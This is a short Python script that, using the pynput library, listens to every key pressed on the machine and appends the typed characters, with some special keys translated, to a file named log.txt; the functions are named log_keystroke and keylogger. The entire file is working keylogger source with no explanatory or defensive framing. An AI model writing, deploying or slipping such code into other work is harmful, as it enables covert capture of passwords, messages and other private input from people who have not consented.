from pynput.keyboard import Listener


def log_keystroke(key):
    key = str(key).replace("'", "")

    if key == "Key.enter":
        key = '\n'

    elif key == 'Key.space':
        key = ' '

    elif key == 'Key.backspace' or key == 'Key.tab':
        key = '[' + key + ']'

    elif key[0:3] == 'Key':
        key = ''

    elif key[0] == '<' and len(key) >= 4:
        key = chr(int(key[1:-1]) - 48)

    with open("log.txt", 'a') as f:
        f.write(key)

def keylogger():
    with Listener(on_press=log_keystroke) as listener:
        listener.join()